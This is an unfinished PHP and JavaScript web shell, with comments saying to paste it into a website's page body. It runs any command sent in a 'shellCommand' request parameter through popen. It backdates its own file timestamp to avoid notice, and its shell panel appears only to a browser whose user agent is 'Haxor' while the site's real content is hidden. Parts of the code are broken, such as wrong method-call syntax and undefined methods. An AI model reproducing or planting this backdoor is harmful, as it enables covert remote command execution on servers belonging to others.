<!-- Above here, should be the end of the content in the <body> tag -->
<!-- Place the entire content in a <div id="luserContent"> tag  -->

<!-- Don't include this jQuery API if it's already included on the site -->
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<div id="haxored" hidden="true" style='margin: 0px; padding: 0px; width: 100%; height: 100%; color: #fff; background-color: #161616;'>

<?php
	class UserInterface
	{
		public $pwd = "";
		private $currentUser = "";
		private $mode = "r";
		private $errorToo = '2>&1';
		private $command = "";

		public function doCommand($command)
		{
			$mode = $this->mode;
			return popen($command,$command);
		}
		
		public function getPwd()
		{
			$this->pwd = popen("/bin/pwd",$this->mode);
			return $this->pwd;
		}

		public function cd($path)
		{
			chdir($path);
		}

		public function timeStamp($stamp)
		{
			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
		}
	}

	$userInterface = new UserInterface();
	if(isset($_GET['command'])) {
		$command = $_GET['command'];
		switch($command) {
			case "pwd":
				$pwd = $userInterface.getPwd();
				break;
			case "perm":
				$permissions = $userInterface.getPermissions();
				break;
			case "ps":
				$processes = $userInterface.getProcesses();
				break;
		}
	}
	if(isset($_GET['shellCommand'])) {
		$myCommand = $_GET['shellCommand'];
		$shellOut = $userInterface.doCommand($myCommand);
	}
?>
<style rel="stylesheet" type="text/css">
#Xmenu {
	background-color: #0C0C0C;
	float: left;
	width: 100%;
}

#XmenuNav ul li {
	list-style-type: none;
	display: inline;
}

#XmenuNav li button {
	display: block;
	border-right: 2px solid #FFFFFF;
	padding: 3px 10px;
	float: left;
	color: #FFFFFF;
}

#XmenuNav li button:hover {
	background-color: #CCCCCC;
}
</style>
<div id="Xcontainer">
	<div id="XmenuNav">
		<form action="#" id="XmenuForm">
		<ul class="XmenuOptions">
			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
			<li><button id="XbuttonPerm" name="command" value="perm">Permissions</button></li>
			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
		</ul>
		</form>
	<br>
	</div>
	<div id="XmainContainer">
		<div id="XmainShell">
			<div id="XoutputShell">
			</div>
			<div id="XinputShell">
			<form action="CHANGEME" method="POST">
			</form>
			</div>
		<div id="XsideBar">
			<ul>
				<li>Something here?</li>
				<li>or here</li>
				<li>or here</li>
			</ul>
		</div>
<script type="text/javascript">
$(document).ready( function() {
	$("#XmenuForm").on('click', function(e) {
		e.preventDefault();
		$.ajax({
			url: "127.0.0.1/shell.php",
			type: "GET",
			data: $(this).serialize()
		});
	});
});
</script>
</div>

<script type="text/javascript">
	$(document).ready(function() {
		if(navigator.userAgent == "Haxor") {
			console.log("Hello Master.")
			$("body").css({"margin":"0px"});
			$("#luserContent").remove();
			$("#haxored").prop("hidden", false);
		} else {
			console.log("#");	
			$("#haxored").remove();
		}
	});
</script>
<!-- Below here should be the closing </body> tag -->
